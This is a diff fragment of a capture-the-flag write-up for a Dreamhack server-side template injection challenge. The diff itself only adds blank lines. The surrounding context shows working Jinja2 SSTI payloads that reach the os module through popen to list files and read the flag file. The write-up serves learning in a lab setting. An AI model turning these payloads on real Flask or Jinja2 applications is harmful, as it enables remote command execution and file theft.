@@ -1,8 +1,10 @@
 # easy server side
 > **Description**
+> 
 > Let's practice the server side!
 > 
 > 2025.10.19 03:03 Uninten Edit
+> 
 > [Link](https://dreamhack.io/wargame/challenges/2364)
 
 In this challenge, we are provided with two files: app.py and admin.py.
@@ -65,7 +67,9 @@ The data is passed directly into the `user_input` variable via an f-string. The 
 Since the outer double curly braces `{{ ... }}` remain active, if we input `{{7*7}}`, the f-string interpolation results in a structure like `{{{{7*7}}}}`. The server then renders the inner expression, processing it as valid Jinja2 syntax, and returns `49`.
 From this observation, we can see that bypassing the filter to execute an SSTI payload is straightforward.
 First, we need to identify the filename containing the flag. We can achieve this by accessing the os module to execute a shell command:
+
 `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
+
 The server responds with the directory listing:
 ```os
 Dockerfile 
@@ -75,7 +79,9 @@ app.py
 public usr
 ```
 We can see the target file -> `Specfile`. Now, we simply proceed to read this file to retrieve the flag:
+
 `{{config.__class__.__init__.__globals__['os'].popen('cat Specfile').read()}}`
+
 Upon injecting this payload, we receive the response containing the flag:
 ```os
 title = easy server side 
